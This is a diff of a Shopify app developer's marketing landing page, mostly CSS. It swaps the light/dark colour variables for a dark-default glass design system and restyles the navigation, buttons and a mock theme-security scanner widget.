@@ -1,13 +1,13 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" data-theme="dark">
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-    <meta name="color-scheme" content="light dark" />
-    <title>Galaxy Apps — Shopify Apps for Automatic Theme Backup &amp; AI Security Scanning</title>
+    <meta name="color-scheme" content="dark light" />
+    <title>Galaxy Apps | Automated Shopify Theme Security &amp; Cloud Backups</title>
     <meta
       name="description"
-      content="Galaxy Apps builds Shopify apps that protect your store automatically — AI-powered theme security scanning and automated theme &amp; order backups. Home of the ThemeSafe suite."
+      content="Galaxy Apps builds automated protection for Shopify stores: AI-powered theme code security review and scheduled theme and order backups."
     />
     <meta name="author" content="Galaxy Apps" />
     <meta name="robots" content="index, follow" />
@@ -16,17 +16,17 @@
     <!-- Open Graph -->
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Galaxy Apps" />
-    <meta property="og:title" content="Galaxy Apps — Shopify Apps That Protect Your Store Automatically" />
+    <meta property="og:title" content="Galaxy Apps | Automated Shopify Theme Security &amp; Cloud Backups" />
     <meta
       property="og:description"
-      content="Home of the ThemeSafe suite on the Shopify App Store: AI-powered theme code security review, automatic theme backups, and order backup automation."
+      content="Home of the ThemeSafe suite on the Shopify App Store: AI-powered theme code security scanning, automatic theme backups, and order backup automation."
     />
     <meta property="og:url" content="https://galaxy-apps.com/" />
     <meta property="og:locale" content="en_US" />
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Galaxy Apps — Shopify Apps That Protect Your Store Automatically" />
+    <meta name="twitter:title" content="Galaxy Apps | Automated Shopify Theme Security &amp; Cloud Backups" />
     <meta
       name="twitter:description"
       content="AI-powered theme code security scanning and automatic backups for Shopify merchants worldwide."
@@ -34,16 +34,12 @@
 
     <!-- Favicon -->
     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-    <link
-      rel="alternate icon"
-      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%230a1628'/%3E%3Cpath d='M16 6l2.2 5.6L24 13l-5.8 1.4L16 20l-2.2-5.6L8 13l5.8-1.4z' fill='%232dd4bf'/%3E%3Ccircle cx='24.5' cy='22.5' r='1.6' fill='%23f5b544'/%3E%3C/svg%3E"
-    />
 
-    <!-- Fonts: Plus Jakarta Sans + JetBrains Mono -->
+    <!-- Fonts: Outfit + Plus Jakarta Sans + JetBrains Mono -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
-      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Outfit:wght@500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap"
       rel="stylesheet"
     />
 
@@ -132,56 +128,71 @@
     </script>
 
     <style>
-      :root {
-        --bg: #f4f7f9;
-        --bg-soft: #ecf1f4;
-        --surface: #ffffff;
-        --surface-2: #f8fafb;
-        --ink: #0b1526;
-        --ink-2: #33455e;
-        --muted: #5d7089;
-        --line: #dde5ec;
-        --accent: #0d9488;
-        --accent-strong: #0b7c71;
-        --accent-soft: #e2f4f1;
-        --amber: #f0a832;
-        --danger: #dc4446;
-        --danger-soft: #fdecec;
-        --warn: #d97706;
-        --warn-soft: #fdf3e0;
-        --ok: #15936b;
-        --ok-soft: #e3f5ec;
-        --navy: #081226;
-        --navy-2: #0d1d38;
-        --navy-line: rgba(148, 184, 220, 0.16);
-        --navy-ink: #eef4fb;
-        --navy-muted: #9db2cc;
-        --shadow-lg: 0 24px 60px -18px rgba(8, 22, 44, 0.28);
-        --shadow-md: 0 12px 32px -12px rgba(8, 22, 44, 0.18);
-        --radius: 18px;
-        --font: "Plus Jakarta Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+      /* ==========================================================================
+         TASTE-SKILL DESIGN SYSTEM: ETHEREAL GLASS & DOUBLE-BEZEL ARCHITECTURE
+         Page Theme Lock: Single cohesive theme across all sections (Dark default,
+         full Light parity via [data-theme="light"]).
+         Single Accent Lock: Emerald-Teal (#14b8a6 / #0d9488).
+         Shape Consistency Lock: Concentric squircle hierarchy (28px shell / 22px core / 999px interactive pills).
+         ========================================================================== */
+      :root,
+      [data-theme="dark"] {
+        --bg: #060911;
+        --bg-elevated: #0a101d;
+        --shell-bg: rgba(255, 255, 255, 0.028);
+        --shell-border: rgba(255, 255, 255, 0.075);
+        --core-bg: #0c1322;
+        --core-bg-alt: #10192d;
+        --core-border: rgba(255, 255, 255, 0.07);
+        --core-highlight: inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        --ink: #f1f5f9;
+        --ink-2: #cbd5e1;
+        --muted: #7e91ab;
+        --line: rgba(148, 163, 184, 0.14);
+        --accent: #14b8a6;
+        --accent-strong: #2dd4bf;
+        --accent-soft: rgba(20, 184, 166, 0.13);
+        --accent-border: rgba(45, 212, 191, 0.34);
+        --accent-ink: #04231f;
+        --danger: #f87171;
+        --danger-soft: rgba(248, 113, 113, 0.14);
+        --warn: #fbbf24;
+        --warn-soft: rgba(251, 191, 36, 0.14);
+        --shadow-ambient: 0 28px 70px -20px rgba(2, 6, 16, 0.78);
+        --glass-nav: rgba(10, 16, 29, 0.76);
+        --display: "Outfit", system-ui, -apple-system, sans-serif;
+        --sans: "Plus Jakarta Sans", system-ui, -apple-system, sans-serif;
         --mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
+        --spring: cubic-bezier(0.32, 0.72, 0, 1);
+        --expo: cubic-bezier(0.16, 1, 0.3, 1);
       }
-      @media (prefers-color-scheme: dark) {
-        :root {
-          --bg: #060b16;
-          --bg-soft: #0a1220;
-          --surface: #0c1626;
-          --surface-2: #0a1322;
-          --ink: #e9f0f8;
-          --ink-2: #c2d2e4;
-          --muted: #8ea3bd;
-          --line: #1d2c44;
-          --accent: #2dd4bf;
-          --accent-strong: #5eead4;
-          --accent-soft: #0d2b2e;
-          --danger-soft: #33161a;
-          --warn-soft: #33270f;
-          --ok-soft: #0f2d22;
-          --shadow-lg: 0 24px 60px -18px rgba(0, 0, 0, 0.65);
-          --shadow-md: 0 12px 32px -12px rgba(0, 0, 0, 0.55);
-        }
+
+      [data-theme="light"] {
+        --bg: #f5f7fa;
+        --bg-elevated: #edf1f6;
+        --shell-bg: rgba(11, 21, 38, 0.035);
+        --shell-border: rgba(11, 21, 38, 0.08);
+        --core-bg: #ffffff;
+        --core-bg-alt: #f8fafc;
+        --core-border: rgba(11, 21, 38, 0.08);
+        --core-highlight: inset 0 1px 0 rgba(255, 255, 255, 0.9);
+        --ink: #0b1322;
+        --ink-2: #2c3d55;
+        --muted: #586a84;
+        --line: rgba(15, 23, 42, 0.1);
+        --accent: #0d9488;
+        --accent-strong: #0f766e;
+        --accent-soft: rgba(13, 148, 136, 0.1);
+        --accent-border: rgba(13, 148, 136, 0.32);
+        --accent-ink: #ffffff;
+        --danger: #dc2626;
+        --danger-soft: rgba(220, 38, 38, 0.1);
+        --warn: #d97706;
+        --warn-soft: rgba(217, 119, 6, 0.12);
+        --shadow-ambient: 0 24px 56px -18px rgba(11, 21, 38, 0.12);
+        --glass-nav: rgba(255, 255, 255, 0.82);
       }
+
       * {
         box-sizing: border-box;
       }
@@ -190,1659 +201,1687 @@
       }
       body {
         margin: 0;
-        font-family: var(--font);
-        background: var(--bg);
+        font-family: var(--sans);
+        background-color: var(--bg);
+        background-image:
+          radial-gradient(900px 500px at 78% 4%, rgba(20, 184, 166, 0.11), transparent 62%),
+          radial-gradient(700px 420px at 14% 28%, rgba(20, 184, 166, 0.05), transparent 65%);
         color: var(--ink);
         line-height: 1.6;
         -webkit-font-smoothing: antialiased;
+        overflow-x: hidden;
+      }
+
+      /* Fixed SVG film-grain overlay (GPU-safe, pointer-events: none, z-index 40) */
+      body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        z-index: 40;
+        pointer-events: none;
+        opacity: 0.025;
+        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+      }
+
+      a {
+        color: inherit;
       }
       img,
       svg {
         display: block;
       }
-      a {
-        color: inherit;
+      .skip-link {
+        position: absolute;
+        left: -9999px;
+        top: 12px;
+        z-index: 100;
+        padding: 10px 18px;
+        border-radius: 999px;
+        background: var(--accent);
+        color: var(--accent-ink);
+        font-weight: 700;
+        text-decoration: none;
       }
-      .wrap {
-        max-width: 1180px;
-        margin: 0 auto;
-        padding: 0 24px;
-      }
-      section {
-        scroll-margin-top: 92px;
+      .skip-link:focus {
+        left: 20px;
       }
 
-      /* ---------- reveal on scroll ---------- */
-      .rv.in {
-        animation: riseIn 0.65s ease both;
+      .wrap {
+        max-width: 1280px;
+        margin: 0 auto;
+        padding: 0 28px;
       }
-      @keyframes riseIn {
-        from {
-          opacity: 0;
-          transform: translateY(16px);
-        }
-        to {
-          opacity: 1;
-          transform: none;
-        }
+      section {
+        scroll-margin-top: 104px;
+      }
+      .tabular {
+        font-variant-numeric: tabular-nums;
+      }
+
+      /* ---------- Scroll Reveal Interpolation (GPU-safe transform + opacity only) ---------- */
+      .rv {
+        opacity: 0;
+        transform: translateY(22px);
+        transition:
+          opacity 0.75s var(--expo),
+          transform 0.75s var(--expo);
+      }
+      .rv.in {
+        opacity: 1;
+        transform: translateY(0);
       }
       @media (prefers-reduced-motion: reduce) {
         html {
           scroll-behavior: auto;
         }
-        .rv.in {
-          animation: none;
+        .rv {
+          opacity: 1;
+          transform: none;
+          transition: none;
         }
         * {
           animation: none !important;
+          transition-duration: 0.01ms !important;
         }
       }
 
-      /* ---------- header ---------- */
-      .site-header {
-        position: sticky;
+      /* ---------- Floating "Fluid Island" Navigation ---------- */
+      .nav-sentinel {
+        position: absolute;
         top: 0;
-        z-index: 60;
-        background: color-mix(in srgb, var(--bg) 88%, transparent);
-        backdrop-filter: blur(14px);
-        -webkit-backdrop-filter: blur(14px);
-        border-bottom: 1px solid transparent;
-        transition: border-color 0.25s ease, box-shadow 0.25s ease;
+        left: 0;
+        width: 1px;
+        height: 16px;
+        pointer-events: none;
       }
-      .site-header.scrolled {
-        border-bottom-color: var(--line);
-        box-shadow: 0 8px 30px -18px rgba(8, 22, 44, 0.35);
+      .island-header {
+        position: sticky;
+        top: 18px;
+        z-index: 50;
+        padding: 0 20px;
       }
-      .header-in {
+      .island-nav {
+        max-width: 1160px;
+        margin: 0 auto;
+        height: 64px;
+        padding: 0 10px 0 18px;
+        border-radius: 999px;
+        background: var(--glass-nav);
+        backdrop-filter: blur(20px) saturate(160%);
+        -webkit-backdrop-filter: blur(20px) saturate(160%);
+        border: 1px solid var(--shell-border);
+        box-shadow:
+          var(--core-highlight),
+          0 16px 40px -16px rgba(0, 0, 0, 0.45);
         display: flex;
         align-items: center;
-        gap: 24px;
-        height: 72px;
+        gap: 18px;
+        transition:
+          border-color 0.35s var(--spring),
+          box-shadow 0.35s var(--spring);
+      }
+      .island-header.elevated .island-nav {
+        border-color: var(--accent-border);
       }
       .brand {
-        display: flex;
+        display: inline-flex;
         align-items: center;
         gap: 11px;
         text-decoration: none;
-        font-weight: 800;
-        font-size: 1.13rem;
+        font-family: var(--display);
+        font-weight: 700;
+        font-size: 1.08rem;
         letter-spacing: -0.02em;
         white-space: nowrap;
       }
-      .brand .mark {
-        width: 36px;
-        height: 36px;
+      .brand-mark {
+        width: 34px;
+        height: 34px;
+        border-radius: 10px;
         flex: none;
       }
-      .brand small {
-        display: block;
-        font-size: 0.62rem;
-        font-weight: 600;
-        letter-spacing: 0.14em;
-        text-transform: uppercase;
-        color: var(--muted);
-        margin-top: 1px;
-      }
-      .main-nav {
+      .nav-links {
         display: flex;
-        gap: 4px;
+        align-items: center;
+        gap: 2px;
         margin-left: auto;
       }
-      .main-nav a {
+      .nav-links a {
         text-decoration: none;
-        font-size: 0.92rem;
+        font-size: 0.88rem;
         font-weight: 500;
         color: var(--ink-2);
-        padding: 8px 13px;
-        border-radius: 9px;
-        transition: color 0.15s ease, background 0.15s ease;
+        padding: 8px 14px;
+        border-radius: 999px;
+        white-space: nowrap;
+        transition:
+          color 0.25s var(--spring),
+          background-color 0.25s var(--spring);
       }
-      .main-nav a:hover {
+      .nav-links a:hover {
         color: var(--ink);
-        background: var(--bg-soft);
+        background: var(--shell-bg);
       }
-      .btn {
-        display: inline-flex;
+      .nav-actions {
+        display: flex;
         align-items: center;
         gap: 8px;
-        font-family: var(--font);
-        font-weight: 600;
-        font-size: 0.93rem;
-        text-decoration: none;
-        border: 0;
+      }
+      .theme-btn,
+      .nav-toggle {
+        width: 40px;
+        height: 40px;
+        border-radius: 999px;
+        border: 1px solid var(--shell-border);
+        background: var(--shell-bg);
+        color: var(--ink-2);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
         cursor: pointer;
-        padding: 11px 20px;
-        border-radius: 11px;
-        transition: transform 0.15s ease, background 0.2s ease, box-shadow 0.2s ease;
+        transition:
+          color 0.25s var(--spring),
+          border-color 0.25s var(--spring),
+          transform 0.2s var(--spring);
       }
-      .btn:active {
-        transform: translateY(1px);
-      }
-      .btn-primary {
-        background: var(--accent);
-        color: #fff;
-        box-shadow: 0 10px 24px -10px var(--accent);
-      }
-      .btn-primary:hover {
-        background: var(--accent-strong);
-      }
-      @media (prefers-color-scheme: dark) {
-        .btn-primary {
-          color: #04211d;
-        }
-      }
-      .btn-ghost {
-        background: transparent;
+      .theme-btn:hover,
+      .nav-toggle:hover {
         color: var(--ink);
-        border: 1px solid var(--line);
+        border-color: var(--accent-border);
       }
-      .btn-ghost:hover {
-        border-color: var(--muted);
-      }
-      .btn-light {
-        background: #fff;
-        color: #0b1526;
-      }
-      .btn-light:hover {
-        background: #e8f4f2;
-      }
-      .btn-outline-light {
-        background: transparent;
-        color: #eef4fb;
-        border: 1px solid rgba(190, 215, 240, 0.4);
-      }
-      .btn-outline-light:hover {
-        border-color: rgba(190, 215, 240, 0.85);
-      }
-      .header-cta {
-        margin-left: 6px;
-        white-space: nowrap;
+      .theme-btn:active,
+      .nav-toggle:active {
+        transform: scale(0.96);
       }
       .nav-toggle {
         display: none;
-        margin-left: auto;
-        background: none;
-        border: 1px solid var(--line);
-        border-radius: 10px;
-        width: 42px;
-        height: 42px;
+      }
+
+      /* ---------- Haptic "Button-in-Button" Island CTA ---------- */
+      .btn-island {
+        display: inline-flex;
+        align-items: center;
+        gap: 12px;
+        font-family: var(--sans);
+        font-weight: 600;
+        font-size: 0.9rem;
+        line-height: 1;
+        white-space: nowrap;
+        text-decoration: none;
+        padding: 7px 8px 7px 20px;
+        border-radius: 999px;
+        background: var(--accent);
+        color: var(--accent-ink);
+        border: 1px solid transparent;
         cursor: pointer;
+        transition:
+          transform 0.35s var(--spring),
+          background-color 0.35s var(--spring),
+          box-shadow 0.35s var(--spring);
+      }
+      .btn-island:hover {
+        background: var(--accent-strong);
+        box-shadow: 0 12px 28px -10px var(--accent);
+      }
+      .btn-island:active {
+        transform: scale(0.98);
+      }
+      .btn-island .btn-pod {
+        width: 30px;
+        height: 30px;
+        border-radius: 999px;
+        background: rgba(4, 35, 31, 0.16);
+        display: inline-flex;
         align-items: center;
         justify-content: center;
+        transition: transform 0.35s var(--spring);
+      }
+      [data-theme="light"] .btn-island .btn-pod {
+        background: rgba(255, 255, 255, 0.22);
+      }
+      .btn-island:hover .btn-pod {
+        transform: translate(2px, -2px) scale(1.05);
+      }
+
+      .btn-secondary {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        font-family: var(--sans);
+        font-weight: 600;
+        font-size: 0.9rem;
+        line-height: 1;
+        white-space: nowrap;
+        text-decoration: none;
+        padding: 13px 22px;
+        border-radius: 999px;
+        background: var(--shell-bg);
         color: var(--ink);
+        border: 1px solid var(--shell-border);
+        transition:
+          border-color 0.3s var(--spring),
+          background-color 0.3s var(--spring),
+          transform 0.2s var(--spring);
+      }
+      .btn-secondary:hover {
+        border-color: var(--accent-border);
+        background: var(--accent-soft);
+      }
+      .btn-secondary:active {
+        transform: scale(0.98);
       }
 
-      /* ---------- hero ---------- */
-      .hero-band {
-        background:
-          radial-gradient(1.5px 1.5px at 12% 22%, rgba(255, 255, 255, 0.75) 50%, transparent 51%),
-          radial-gradient(1px 1px at 32% 68%, rgba(255, 255, 255, 0.5) 50%, transparent 51%),
-          radial-gradient(1.8px 1.8px at 58% 14%, rgba(255, 255, 255, 0.6) 50%, transparent 51%),
-          radial-gradient(1px 1px at 76% 42%, rgba(255, 255, 255, 0.55) 50%, transparent 51%),
-          radial-gradient(1.4px 1.4px at 90% 74%, rgba(255, 255, 255, 0.45) 50%, transparent 51%),
-          radial-gradient(1px 1px at 45% 88%, rgba(255, 255, 255, 0.4) 50%, transparent 51%),
-          radial-gradient(900px 480px at 85% -10%, rgba(45, 212, 191, 0.15), transparent 60%),
-          linear-gradient(180deg, var(--navy-2), var(--navy));
-        color: var(--navy-ink);
+      /* ---------- Double-Bezel (Doppelrand) Hardware Container ---------- */
+      .bezel-shell {
+        padding: 6px;
+        border-radius: 28px;
+        background: var(--shell-bg);
+        border: 1px solid var(--shell-border);
+        box-shadow: var(--shadow-ambient);
+      }
+      .bezel-core {
+        border-radius: 22px;
+        background: var(--core-bg);
+        border: 1px solid var(--core-border);
+        box-shadow: var(--core-highlight);
+        height: 100%;
         overflow: hidden;
       }
-      .hero {
-        display: grid;
-        grid-template-columns: 1.02fr 1fr;
-        gap: 52px;
-        padding: 76px 0 84px;
-        align-items: center;
-      }
-      .hero-badge {
+
+      /* ---------- Eyebrow (Strictly rationed: max 2 on entire page) ---------- */
+      .eyebrow-pill {
         display: inline-flex;
         align-items: center;
         gap: 8px;
-        font-size: 0.8rem;
-        font-weight: 600;
-        color: #a7f3ea;
-        border: 1px solid rgba(45, 212, 191, 0.35);
-        background: rgba(45, 212, 191, 0.08);
-        padding: 6px 13px;
-        border-radius: 999px;
-      }
-      .hero-badge .dot {
-        width: 7px;
-        height: 7px;
-        border-radius: 50%;
-        background: #2dd4bf;
-        box-shadow: 0 0 0 4px rgba(45, 212, 191, 0.18);
-      }
-      .hero h1 {
-        font-size: clamp(2.3rem, 4.5vw, 3.5rem);
-        line-height: 1.08;
-        font-weight: 800;
-        letter-spacing: -0.025em;
-        margin: 22px 0 18px;
-      }
-      .hero h1 .hl {
-        color: #2dd4bf;
-      }
-      .hero p.lede {
-        font-size: 1.08rem;
-        color: var(--navy-muted);
-        margin: 0 0 30px;
-        max-width: 34rem;
-      }
-      .hero p.lede strong {
-        color: #dbeafe;
-        font-weight: 600;
-      }
-      .hero-ctas {
-        display: flex;
-        gap: 12px;
-        flex-wrap: wrap;
-      }
-      .trust-row {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 10px 26px;
-        margin-top: 38px;
-        padding-top: 26px;
-        border-top: 1px solid var(--navy-line);
-      }
-      .trust-item {
-        font-size: 0.87rem;
-        color: var(--navy-muted);
-        display: flex;
-        align-items: center;
-        gap: 8px;
-      }
-      .trust-item b {
-        color: #fff;
-        font-weight: 700;
-      }
-      .stars {
-        color: var(--amber);
-        font-size: 0.95rem;
-        letter-spacing: 2px;
-      }
-
-      /* Shopify Embedded App Dashboard Preview */
-      .dash-frame {
-        background: #0d1930;
-        border: 1px solid rgba(148, 184, 220, 0.24);
-        border-radius: 16px;
-        box-shadow: 0 40px 80px -30px rgba(0, 0, 0, 0.72);
-        overflow: hidden;
-        font-size: 0.82rem;
-      }
-      .dash-bar {
-        display: flex;
-        align-items: center;
-        gap: 7px;
-        padding: 11px 14px;
-        background: rgba(255, 255, 255, 0.04);
-        border-bottom: 1px solid rgba(148, 184, 220, 0.14);
-      }
-      .dash-bar i {
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background: #33455e;
-      }
-      .dash-bar i:nth-child(1) {
-        background: #e05d5d;
-      }
-      .dash-bar i:nth-child(2) {
-        background: #e8b34b;
-      }
-      .dash-bar i:nth-child(3) {
-        background: #3fbf72;
-      }
-      .dash-url {
-        margin-left: 8px;
-        font-family: var(--mono);
-        font-size: 0.69rem;
-        color: #9cb4d2;
-        background: rgba(255, 255, 255, 0.05);
-        padding: 4px 10px;
-        border-radius: 6px;
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-      }
-      .dash-status-pill {
-        margin-left: auto;
-        font-family: var(--mono);
-        font-size: 0.66rem;
-        color: #6fe3a5;
-        background: rgba(63, 191, 114, 0.14);
-        padding: 3px 8px;
-        border-radius: 999px;
-      }
-      .dash-body {
-        display: grid;
-        grid-template-columns: 122px 1fr;
-        min-height: 326px;
-      }
-      .dash-side {
-        border-right: 1px solid rgba(148, 184, 220, 0.12);
-        padding: 16px 12px;
-        display: flex;
-        flex-direction: column;
-        gap: 4px;
-      }
-      .dash-side span {
-        padding: 6px 9px;
-        border-radius: 7px;
-        color: #8ea6c4;
-        font-size: 0.76rem;
-        font-weight: 500;
-      }
-      .dash-side span.on {
-        background: rgba(45, 212, 191, 0.13);
-        color: #5eead4;
-        font-weight: 600;
-      }
-      .dash-main {
-        padding: 18px;
-      }
-      .dash-main-top {
-        display: flex;
-        align-items: flex-start;
-        justify-content: space-between;
-        gap: 10px;
-        margin-bottom: 12px;
-      }
-      .dash-main h4 {
-        margin: 0 0 2px;
-        font-size: 0.95rem;
-        color: #f2f7fd;
-      }
-      .dash-main .sub {
-        color: #8ea6c4;
-        font-size: 0.74rem;
-      }
-      .scan-row {
-        display: flex;
-        align-items: center;
-        gap: 9px;
-        padding: 8px 11px;
-        border: 1px solid rgba(148, 184, 220, 0.13);
-        border-radius: 10px;
-        margin-bottom: 7px;
-        background: rgba(255, 255, 255, 0.025);
-      }
-      .scan-row code {
         font-family: var(--mono);
         font-size: 0.72rem;
-        color: #c9d9ec;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-      }
-      .scan-row .meta-line {
-        font-family: var(--mono);
-        font-size: 0.66rem;
-        color: #6f88a8;
-      }
-      .scan-row .tag {
-        margin-left: auto;
-        flex: none;
-      }
-      .tag {
-        font-size: 0.66rem;
-        font-weight: 700;
-        letter-spacing: 0.04em;
-        padding: 3px 8px;
-        border-radius: 999px;
+        font-weight: 600;
+        letter-spacing: 0.14em;
         text-transform: uppercase;
+        color: var(--accent-strong);
+        background: var(--accent-soft);
+        border: 1px solid var(--accent-border);
+        padding: 6px 14px;
+        border-radius: 999px;
       }
-      .tag-ok {
-        background: rgba(63, 191, 114, 0.16);
-        color: #6fe3a5;
+
+      /* ==========================================================================
+         SECTION 1: ASYMMETRIC SPLIT HERO (Fits initial viewport, max 4 text items)
+         ========================================================================== */
+      .hero-section {
+        min-height: calc(100dvh - 88px);
+        display: flex;
+        align-items: center;
+        padding: 48px 0 64px;
       }
-      .tag-warn {
-        background: rgba(232, 179, 75, 0.16);
-        color: #f2c66d;
+      .hero-grid {
+        display: grid;
+        grid-template-columns: 1.05fr 1fr;
+        gap: 56px;
+        align-items: center;
       }
-      .tag-risk {
-        background: rgba(224, 93, 93, 0.18);
-        color: #ff9c9c;
+      .hero-copy h1 {
+        font-family: var(--display);
+        font-size: clamp(2.5rem, 4.4vw, 3.85rem);
+        font-weight: 800;
+        line-height: 1.06;
+        letter-spacing: -0.03em;
+        margin: 22px 0 20px;
+        text-wrap: balance;
       }
-      .tag-ai {
-        background: rgba(45, 212, 191, 0.15);
-        color: #5eead4;
+      .hero-copy h1 em {
+        font-style: italic;
+        font-weight: 700;
+        color: var(--accent-strong);
+        padding-bottom: 4px;
       }
-      .ai-box {
-        margin-top: 11px;
-        border: 1px solid rgba(45, 212, 191, 0.3);
-        background: rgba(45, 212, 191, 0.06);
-        border-radius: 10px;
-        padding: 11px 13px;
+      .hero-copy p.hero-sub {
+        font-size: 1.12rem;
+        color: var(--ink-2);
+        margin: 0 0 32px;
+        max-width: 44ch;
+        line-height: 1.6;
       }
-      .ai-box .ai-head {
+      .hero-actions {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        flex-wrap: wrap;
+      }
+
+      /* Interactive Live Theme Scanner Component inside Hero */
+      .scanner-top {
         display: flex;
         align-items: center;
         justify-content: space-between;
-        gap: 8px;
-        font-weight: 700;
-        font-size: 0.76rem;
-        color: #5eead4;
-        margin-bottom: 5px;
+        gap: 12px;
+        padding: 14px 18px;
+        border-bottom: 1px solid var(--line);
+        background: var(--core-bg-alt);
       }
-      .ai-box .ai-head-left {
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-      }
-      .ai-box p {
-        margin: 0;
-        color: #b9cde4;
-        font-size: 0.77rem;
-        line-height: 1.5;
-      }
-      .score-chip {
-        display: inline-flex;
-        align-items: baseline;
-        gap: 5px;
-        background: rgba(63, 191, 114, 0.14);
-        color: #6fe3a5;
-        border-radius: 9px;
-        padding: 5px 10px;
-        font-weight: 700;
-        font-size: 0.78rem;
-        white-space: nowrap;
-      }
-      .score-chip small {
-        font-weight: 500;
-        color: #9fd8ba;
-      }
-      .hero-visual {
-        position: relative;
-      }
-      .float-card {
-        position: absolute;
+      .scanner-store {
+        font-family: var(--mono);
+        font-size: 0.74rem;
+        color: var(--ink-2);
         display: flex;
         align-items: center;
-        gap: 9px;
-        background: #101f3a;
-        border: 1px solid rgba(148, 184, 220, 0.25);
-        color: #e6effa;
-        border-radius: 12px;
-        padding: 10px 14px;
-        font-size: 0.78rem;
-        font-weight: 600;
-        box-shadow: 0 18px 40px -14px rgba(0, 0, 0, 0.65);
+        gap: 8px;
       }
-      .float-card small {
-        display: block;
-        font-weight: 500;
-        color: #8ea6c4;
-        font-size: 0.7rem;
+      .live-indicator {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: var(--accent);
+        box-shadow: 0 0 0 4px var(--accent-soft);
       }
-      .float-1 {
-        top: -20px;
-        right: 22px;
-        animation: floaty 6s ease-in-out infinite;
-      }
-      .float-2 {
-        bottom: -18px;
-        left: -14px;
-        animation: floaty 7s ease-in-out infinite reverse;
-      }
-      @keyframes floaty {
-        0%,
-        100% {
-          transform: translateY(0);
-        }
-        50% {
-          transform: translateY(-7px);
-        }
-      }
-
-      /* ---------- stats ---------- */
-      .stats {
-        display: grid;
-        grid-template-columns: repeat(4, 1fr);
-        gap: 18px;
-        padding: 44px 0 6px;
-      }
-      .stat b {
-        display: block;
-        font-size: 1.65rem;
-        font-weight: 800;
-        letter-spacing: -0.02em;
-      }
-      .stat span {
-        font-size: 0.87rem;
-        color: var(--muted);
-      }
-
-      /* ---------- sections ---------- */
-      .section {
-        padding: 84px 0;
-      }
-      .section-head {
-        max-width: 650px;
-        margin-bottom: 44px;
-      }
-      .section-head h2 {
-        font-size: clamp(1.7rem, 3.2vw, 2.3rem);
-        font-weight: 800;
-        letter-spacing: -0.02em;
-        line-height: 1.15;
-        margin: 0 0 12px;
-      }
-      .section-head p {
-        color: var(--muted);
-        margin: 0;
-        font-size: 1.02rem;
-      }
-      .label {
-        font-size: 0.78rem;
-        font-weight: 700;
-        letter-spacing: 0.13em;
-        text-transform: uppercase;
-        color: var(--accent-strong);
-        margin-bottom: 14px;
-        display: block;
-      }
-
-      /* product cards */
-      .products {
+      .scanner-tabs {
         display: grid;
         grid-template-columns: repeat(3, 1fr);
-        gap: 20px;
-        align-items: stretch;
+        gap: 6px;
+        padding: 12px 16px 0;
       }
-      .app-card {
-        background: var(--surface);
+      .file-tab {
+        font-family: var(--mono);
+        font-size: 0.72rem;
+        padding: 9px 10px;
+        border-radius: 12px;
         border: 1px solid var(--line);
-        border-radius: var(--radius);
-        padding: 28px;
+        background: transparent;
+        color: var(--muted);
+        cursor: pointer;
+        text-align: left;
         display: flex;
-        flex-direction: column;
-        position: relative;
-        transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+        align-items: center;
+        justify-content: space-between;
+        gap: 6px;
+        transition:
+          border-color 0.25s var(--spring),
+          background-color 0.25s var(--spring),
+          color 0.25s var(--spring);
       }
-      .app-card:hover {
-        transform: translateY(-4px);
-        box-shadow: var(--shadow-md);
-        border-color: color-mix(in srgb, var(--accent) 45%, var(--line));
+      .file-tab:hover {
+        color: var(--ink);
+        border-color: var(--accent-border);
       }
-      .app-card.flagship {
-        border-color: color-mix(in srgb, var(--accent) 55%, var(--line));
-        box-shadow: var(--shadow-md);
+      .file-tab.active {
+        background: var(--accent-soft);
+        border-color: var(--accent-border);
+        color: var(--ink);
+        font-weight: 600;
       }
-      .flag-tag {
-        position: absolute;
-        top: -12px;
-        right: 22px;
-        background: var(--accent);
-        color: #fff;
-        font-size: 0.7rem;
-        font-weight: 700;
-        letter-spacing: 0.06em;
-        text-transform: uppercase;
-        padding: 5px 11px;
+      .status-chip {
+        font-family: var(--mono);
+        font-size: 0.65rem;
+        font-weight: 600;
+        padding: 2px 7px;
         border-radius: 999px;
+        text-transform: uppercase;
       }
-      @media (prefers-color-scheme: dark) {
-        .flag-tag {
-          color: #04211d;
-        }
+      .chip-risk {
+        background: var(--danger-soft);
+        color: var(--danger);
       }
-      .app-icon {
-        width: 54px;
-        height: 54px;
-        border-radius: 14px;
-        display: grid;
-        place-items: center;
-        margin-bottom: 18px;
+      .chip-warn {
+        background: var(--warn-soft);
+        color: var(--warn);
       }
